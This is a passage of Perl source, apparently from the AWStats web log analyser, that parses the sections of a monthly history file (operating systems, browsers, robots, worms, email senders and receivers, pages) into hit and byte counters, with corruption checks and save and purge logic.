{\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_OS\n\t\t\tif ( $field[0] eq 'BEGIN_OS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of OS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'os'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_os_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t$_os_p{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_OS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_OS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif ( $field[0] ne 'END_OS' && $field[0] ne \"${xmleb}END_OS\" ) {\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section OS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of OS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'os'};\n\t\t\t\tif ( $SectionsToSave{'os'} ) {\n\t\t\t\t\tSave_History( 'os', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'os'};\n\t\t\t\t\tif ($withpurge) { %_os_h = (); %_os_p = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_BROWSER\n\t\t\tif ( $field[0] eq 'BEGIN_BROWSER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of BROWSER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'browser'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_browser_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t$_browser_p{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_BROWSER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_BROWSER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_BROWSER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_BROWSER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section BROWSER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of BROWSER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'browser'};\n\t\t\t\tif ( $SectionsToSave{'browser'} ) {\n\t\t\t\t\tSave_History( 'browser', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'browser'};\n\t\t\t\t\tif ($withpurge) { %_browser_h = (); %_browser_p = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNREFERER\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNREFERER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of UNKNOWNREFERER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownreferer'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( !$_unknownreferer_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_unknownreferer_l{ $field[0] } =\n\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNREFERER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNREFERER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNREFERER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNREFERER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKNOWNREFERER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKNOWNREFERER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'unknownreferer'};\n\t\t\t\tif ( $SectionsToSave{'unknownreferer'} ) {\n\t\t\t\t\tSave_History( 'unknownreferer', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'unknownreferer'};\n\t\t\t\t\tif ($withpurge) { %_unknownreferer_l = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNREFERERBROWSER\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNREFERERBROWSER' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\" Begin of UNKNOWNREFERERBROWSER section\");\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownrefererbrowser'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( !$_unknownrefererbrowser_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_unknownrefererbrowser_l{ $field[0] } =\n\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNREFERERBROWSER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNREFERERBROWSER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'unknownrefererbrowser'};\n\t\t\t\tif ( $SectionsToSave{'unknownrefererbrowser'} ) {\n\t\t\t\t\tSave_History( 'unknownrefererbrowser',\n\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'unknownrefererbrowser'};\n\t\t\t\t\tif ($withpurge) { %_unknownrefererbrowser_l = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SCREENSIZE\n\t\t\tif ( $field[0] eq 'BEGIN_SCREENSIZE' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SCREENSIZE section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'screensize'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_screensize_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SCREENSIZE'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SCREENSIZE\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SCREENSIZE'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SCREENSIZE\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SCREENSIZE not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SCREENSIZE section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'screensize'};\n\t\t\t\tif ( $SectionsToSave{'screensize'} ) {\n\t\t\t\t\tSave_History( 'screensize', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'screensize'};\n\t\t\t\t\tif ($withpurge) { %_screensize_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ROBOT\n\t\t\tif ( $field[0] eq 'BEGIN_ROBOT' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ROBOT section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'robot'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_robot_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\tif ( !$_robot_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_robot_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$_robot_r{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ROBOT'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ROBOT\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ROBOT'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ROBOT\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ROBOT not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ROBOT section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'robot'};\n\t\t\t\tif ( $SectionsToSave{'robot'} ) {\n\t\t\t\t\tSave_History( 'robot', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'robot'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_robot_h = ();\n\t\t\t\t\t\t%_robot_k = ();\n\t\t\t\t\t\t%_robot_l = ();\n\t\t\t\t\t\t%_robot_r = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_WORMS\n\t\t\tif ( $field[0] eq 'BEGIN_WORMS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of WORMS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'worms'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_worm_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_worm_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\tif ( !$_worm_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_worm_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_WORMS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_WORMS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_WORMS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_WORMS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section WORMS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of WORMS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'worms'};\n\t\t\t\tif ( $SectionsToSave{'worms'} ) {\n\t\t\t\t\tSave_History( 'worms', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'worms'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_worm_h = ();\n\t\t\t\t\t\t%_worm_k = ();\n\t\t\t\t\t\t%_worm_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_EMAILS\n\t\t\tif ( $field[0] eq 'BEGIN_EMAILSENDER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of EMAILSENDER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'emailsender'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_emails_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_emails_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_emails_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_emails_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_EMAILSENDER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EMAILSENDER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_EMAILSENDER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EMAILSENDER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EMAILSENDER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of EMAILSENDER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'emailsender'};\n\t\t\t\tif ( $SectionsToSave{'emailsender'} ) {\n\t\t\t\t\tSave_History( 'emailsender', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'emailsender'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_emails_h = ();\n\t\t\t\t\t\t%_emails_k = ();\n\t\t\t\t\t\t%_emails_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_EMAILR\n\t\t\tif ( $field[0] eq 'BEGIN_EMAILRECEIVER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of EMAILRECEIVER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'emailreceiver'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_emailr_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_emailr_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_emailr_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_emailr_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_EMAILRECEIVER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EMAILRECEIVER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_EMAILRECEIVER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EMAILRECEIVER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EMAILRECEIVER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of EMAILRECEIVER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'emailreceiver'};\n\t\t\t\tif ( $SectionsToSave{'emailreceiver'} ) {\n\t\t\t\t\tSave_History( 'emailreceiver', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'emailreceiver'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_emailr_h = ();\n\t\t\t\t\t\t%_emailr_k = ();\n\t\t\t\t\t\t%_emailr_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SIDER\n\t\t\tif ( $field[0] eq 'BEGIN_SIDER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SIDER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'sider'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'main'} ) {\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t$countloaded < $MaxNbOf{'PageShown'}\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'File'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentPages++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t{ # This is for $HTMLOutput = urldetail, urlentry or urlexit\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterIn{'url'}/\n\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'url'}/ )\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterIn{'url'}/\n\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'url'}/ )\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'File'}\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentPages++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\n# Posssibilite de mettre if ($FilterIn{'url'} && $field[0] =~ /$FilterIn{'url'}/) mais il faut gerer TotalPages de la meme maniere\n\t\t\t\t\t\t\t\t$TotalBytesPages += ( $field[2] || 0 );\n\t\t\t\t\t\t\t\t$TotalEntries    += ( $field[3] || 0 );\n\t\t\t\t\t\t\t\t$TotalExits      += ( $field[4] || 0 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_url_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_url_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_url_e{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] ) 